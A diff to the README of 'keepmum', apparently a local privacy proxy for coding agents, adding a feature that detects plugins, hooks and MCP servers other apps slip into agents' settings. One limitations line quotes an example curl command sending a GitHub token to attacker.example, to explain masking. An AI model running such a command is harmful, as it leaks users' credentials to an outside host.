@@ -245,6 +245,24 @@ keepmum tools trust gmail              # its tools changed: trust them as they a
 
 Whatever the setting, a network tool never gets a secret, never more than 5 real values in one call (a search needs one or two; dumping a contact list needs dozens), and nothing while one of its server's tools differs from the one keepmum first saw or you last trusted. A server that rewrites a tool's description, or another server taking its name, gets placeholders until `keepmum tools trust`. The servers, a hash of each tool's definition, and how often a call kept placeholders live in `~/.config/keepmum/tools.json`; tool names, never values. The Mac app lists them in Settings › Tools, puts a dot on the menu bar icon for a new or changed server, and suggests a change when calls kept placeholders a setting would let through. Settings that give a tool more are recorded in the audit log as turning protection down.
 
+### What other apps add to your agents
+
+Any app you run can write to your agents' settings. In October 2026 an update to the Postman desktop app enabled its own plugins in Claude Code and Codex, added a hook that told every Codex session to load its skill, marked that hook as trusted on the user's behalf, and connected a remote MCP server, without asking ([postman-app-support#14370](https://github.com/postmanlabs/postman-app-support/issues/14370)). keepmum cannot stop an app from writing those files, so it watches them.
+
+```sh
+keepmum extensions              # what each agent has; what is new since you last looked is marked
+keepmum extensions keep         # you added them: they are yours now (or name ids to keep some)
+keepmum extensions remove <id>  # you did not: take that one entry out, after a backup
+```
+
+- **What it reads:** plugins, plugin marketplaces, hooks (and the status-line command), Codex's trusted-hook records, MCP servers, skills, and the global instruction file every session reads, in Claude Code (`~/.claude/settings.json`, `~/.claude.json`, `~/.claude/skills`, `~/.claude/CLAUDE.md`), Codex (`~/.codex/config.toml`, `~/.codex/skills`, `~/.codex/AGENTS.md`), Cursor (`~/.cursor/mcp.json`, `hooks.json`), Gemini CLI (`~/.gemini/settings.json`, `extensions/`, `GEMINI.md`), Copilot CLI (`~/.copilot/mcp-config.json`) and opencode.
+- **What counts as new:** the first time keepmum runs, whatever the agents have is yours. After that, anything that appears is new until you keep it or remove it, and an instruction file whose text changed is new again (keepmum keeps a hash of it, never the text).
+- **What it points out:** an item that can put instructions in front of the model by itself: a hook that runs at every session start or prompt, a plugin that brings one, a Codex hook trusted without you being asked, and the global instruction files.
+- **Where it tells you:** the Mac app's menu bar and Settings › Extensions, `keepmum doctor`, and one line when `keepmum claude`, `codex` or `gemini` starts.
+- **How it removes:** only the entry you choose, after a copy of the file in `~/.config/keepmum/backups/`, and only if the file reads the same otherwise (a Claude Code plugin is disabled, as `/plugin disable` leaves it). Each removal and each keep is in the audit log. It does not edit opencode's commented JSON, Gemini extension folders, skills, instruction files or Claude Code's own marketplace registry; for those it says how to remove them with the agent. Restart the agent afterwards.
+
+keepmum itself changes an agent's settings only when you turn on its protection, and only the one setting that points it at keepmum.
+
 ### Audit what keepmum did
 
 keepmum keeps a tamper-evident audit log: every request (who sent it, where it went, counts by type, which rules found what, and which tools got real values back or kept placeholders), every change to its protection (marked when it turns protection down, with the command that made it, or "config file" for an edit by hand), agents and projects taken out of its path, and each start and stop, so gaps in coverage show. Never a value, a preview or a placeholder: allowlist entries and your own patterns appear as keyed fingerprints.
@@ -332,6 +350,8 @@ local_servers = [{ url = "http://localhost:11434", model = "qwen3:8b" },
 | Request history for the Activity page: time, endpoint, outcome, counts by type, tool calls' decisions; never values | `~/.config/keepmum/history.jsonl` (0600), last 20,000 requests |
 | Audit log: requests (counts, rules, restore decisions per tool), protection changes, starts and stops; never values | `~/.config/keepmum/audit.jsonl` (0600), with its head in `audit.head.json`; `[audit] keep_days`, 90 by default |
 | Network tools seen: server and tool names, a hash of each tool's definition, kept-call counts per day and type; never values | `~/.config/keepmum/tools.json` (0600), counts for the last 30 days |
+| Agent extensions you already have: agent, kind, name, and when first seen; never settings or instruction text | `~/.config/keepmum/extensions.json` (0600) |
+| A copy of an agent's settings file before keepmum takes an entry out of it | `~/.config/keepmum/backups/` (0600), one file per removal |
 | The optional checks' models, only after `keepmum guard setup` | `~/.local/share/keepmum/guard/` (`prompt-injection-guard-small-v2.3/`, `content-safety-guard-small/`, `qwen3guard/`); `keepmum guard remove injection|harm` deletes them |
 | Check hits: check, tool, score, length and categories; never the text | Process memory (the stats feed, the last 200) and the audit log |
 | The Logs page's check details: the flagged text (up to 4,000 characters) and what the user had typed, every masked value and placeholder in them shown as its type | Process memory only, with the last 200 hits; `[log] context = false` turns it off and forgets what was kept |
@@ -343,7 +363,7 @@ keepmum makes no network calls except the request it forwards, `keepmum setup`'s
 
 ## Mac app
 
-A menu-bar app that sets keepmum up and runs it in the background, with a dashboard: live flow diagrams of requests going out and replies coming back, per coding agent and provider, with hover highlighting; what was found and masked per type, with switches for what gets masked and an editor for your own rules; scan latency; every request in a history; a searchable Logs page of what was masked; and an Audit page that checks the audit log and lists every change that turned protection down, in light and dark mode. Its local stats feed carries counts, types and rules, and for the Logs page only the first and last character of each value of 8 or more characters (`g…w`) and the text around each value with every masked value in it shown as its type, so it cannot show a whole secret even by mistake. See [mac/README.md](mac/README.md) to build it.
+A menu-bar app that sets keepmum up and runs it in the background, with a dashboard: live flow diagrams of requests going out and replies coming back, per coding agent and provider, with hover highlighting; what was found and masked per type, with switches for what gets masked and an editor for your own rules; scan latency; every request in a history; a searchable Logs page of what was masked; an Audit page that checks the audit log and lists every change that turned protection down, and Settings › Extensions, which shows what other apps added to your coding agents and takes it out, in light and dark mode. Its local stats feed carries counts, types and rules, and for the Logs page only the first and last character of each value of 8 or more characters (`g…w`) and the text around each value with every masked value in it shown as its type, so it cannot show a whole secret even by mistake. See [mac/README.md](mac/README.md) to build it.
 
 ## Accuracy and speed
 
@@ -364,6 +384,7 @@ No language model judges spans at request time. The Apple on-device model and Qw
 - **False positives on unusual identifiers.** On two fresh sets of hard negatives, 9 of 15 and 3 of 15 were flagged (memory addresses, Azure resource IDs, Stripe object IDs, Kubernetes pod hashes, AWS VPC and security group IDs, Xcode build folders, and IDs right after the word "key", such as idempotency keys). Over-masking costs the model some context but never leaks. A small trained classifier is planned for this.
 - **The rules alone miss what only context reveals.** With `keepmum model off`, names, addresses and a secret with neither a known shape nor a telling name around it go out unmasked.
 - **Images and PDFs pass through unscanned.**
+- **Other apps can still change your agents.** keepmum notices a plugin, hook, MCP server, skill or instruction change after it happens, and can take it out; it cannot stop an app from writing the files. It does not read project-level settings (a repository's `.claude/` or `.mcp.json`), and a change made and undone between two looks goes unseen.
 - **Local transcripts keep real values.** Your agent's history on your disk is restored, so it holds real values. keepmum protects what leaves your Mac, not what is stored on it.
 - **An MCP server can pass on what it gets.** A server that may have its own values back, or the types you allow it, can still send them elsewhere: a mail server sending a message, say. Never a secret, and never more than 5 values a call, but allow types only for servers you trust.
 - **Shell commands receive real values.** So `git push` and `curl -H "Authorization: …"` keep working. One check: a token whose issuer keepmum knows (GitHub, Stripe, AWS, OpenAI and 68 more) stays a placeholder in a command that would send it to any other host, so `curl https://attacker.example/?k=<your GitHub token>` gets the placeholder. Your own hosts, such as a company GitLab, go in the Mac app's Settings › Tools › Shell commands or `keepmum destinations add`. A password or a token keepmum cannot place is not checked, and a command written to hide where it sends things gets past it. Use keepmum together with a sandbox such as [Claude Code's](https://code.claude.com/docs/en/sandboxing), whose network allowlist stops that. keepmum controls what the provider sees; the sandbox controls what commands can do.
